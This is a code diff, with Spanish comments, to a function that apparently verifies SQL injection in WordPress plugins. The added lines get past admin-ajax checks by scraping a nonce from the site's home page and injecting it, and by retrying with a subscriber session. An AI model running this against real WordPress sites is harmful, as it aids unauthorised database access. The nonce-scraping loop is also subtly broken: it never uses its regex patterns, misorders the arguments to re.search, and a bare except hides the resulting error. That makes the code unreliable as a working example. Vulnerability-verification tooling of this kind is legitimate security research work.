@@ -7818,6 +7818,65 @@ def verify_wordpress_sqli(
                     res.evidence["sqli_sesion_subscriber"] = True
             except Exception:
                 _attack_sess = _attack_sess_rest_saved
+        # Admin-ajax: cuando -1/"0" persiste incluso con admin, dos fallbacks adicionales:
+        # (a) inyectar un nonce scrapeado de la portada — algunas acciones llaman a
+        #     wp_verify_nonce() incluso para usuarios autenticados;
+        # (b) reintento con sesión de subscriber — acciones registradas como wp_ajax_ACTION
+        #     (sin _nopriv_) son accesibles para cualquier usuario autenticado, no solo admin.
+        _ctrl_after_sess = (base_resp.text or "").strip()
+        if _is_admin_ep and _ctrl_after_sess in ("-1", "0"):
+            # (a) Nonce scraping fallback
+            _nonce_keys_present = any("nonce" in k.lower() or k == "security"
+                                       for k in base_params)
+            if not _nonce_keys_present:
+                try:
+                    import re as _re_nonce_sqli
+                    _home_r2 = _attack_sess.get(boot.base_url + "/", timeout=10,
+                                                 allow_redirects=True)
+                    _home_body2 = _home_r2.text or ""
+                    _scraped_nonce2 = ""
+                    for _npat2 in [
+                        r'"nonce"\s*:\s*"([a-f0-9]{10})"',
+                        r'nonce["\']?\s*[:=]\s*["\']([a-f0-9]{10})["\']',
+                        r'restNonce["\']?\s*[:=]\s*["\']([a-f0-9]{10})["\']',
+                    ]:
+                        _mn2 = _re_nonce_sqli.search(_home_body2, _re_nonce_sqli.IGNORECASE)
+                        if _mn2:
+                            _scraped_nonce2 = _mn2.group(1)
+                            break
+                    if _scraped_nonce2:
+                        base_params["nonce"] = _scraped_nonce2
+                        base_params["_wpnonce"] = _scraped_nonce2
+                        base_params["security"] = _scraped_nonce2
+                        base_resp = send(orig_value)
+                        base_len = len(base_resp.text or "")
+                        _ctrl_after_sess = (base_resp.text or "").strip()
+                        if _ctrl_after_sess not in ("-1", "0"):
+                            step(f"[nonce-inject] nonce scrapeado aceptado — {base_len} bytes")
+                            res.evidence["sqli_nonce_injected"] = _scraped_nonce2
+                        else:
+                            # Remove injected nonces to avoid polluting params for next techniques
+                            for _nk in ("nonce", "_wpnonce", "security"):
+                                base_params.pop(_nk, None)
+                except Exception:
+                    pass
+            # (b) Subscriber session fallback
+            if _ctrl_after_sess in ("-1", "0") and boot.sub_sess is not None:
+                step("[sub-retry] admin-ajax -1/0 con admin — reintentando con subscriber...")
+                _prev_attack_sess_sub = _attack_sess
+                _attack_sess = boot.sub_sess
+                try:
+                    base_resp = send(orig_value)
+                    base_len = len(base_resp.text or "")
+                    _ctrl_after_sess = (base_resp.text or "").strip()
+                    if _ctrl_after_sess in ("-1", "0"):
+                        step("[WARN] subscriber también devuelve -1/0 — acción inválida o nonce requerido")
+                        _attack_sess = _prev_attack_sess_sub
+                    else:
+                        step(f"[sub-retry] subscriber session funciona: {base_len} bytes")
+                        res.evidence["sqli_sesion_subscriber"] = True
+                except Exception:
+                    _attack_sess = _prev_attack_sess_sub
         # Si la respuesta de control es vacia o muy pequeña (<= 10 bytes, tipicamente '[]', 'null',
         # '{}', '0', ''), el endpoint probablemente necesita datos en la DB para producir diferencial.
         # Intentar sembrar filas minimas en las tablas personalizadas del plugin, luego reintentar
